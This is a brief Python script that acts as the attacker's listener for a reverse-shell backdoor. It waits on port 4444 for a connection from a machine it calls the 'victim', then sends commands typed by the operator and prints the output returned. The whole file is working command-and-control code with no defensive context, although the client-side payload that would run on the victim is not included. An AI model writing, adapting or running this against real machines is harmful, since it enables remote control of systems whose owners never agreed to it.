import socket


my_ip = '127.0.0.1'
port = 4444
server = socket.socket()
server.bind((my_ip,port))
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(1)
victim, victim_addr =server.accept()
print(f'[+] {victim_addr} Victim opened the backdoor')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    victim.send(command)
    print('[+] Command sent')
    output = victim.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
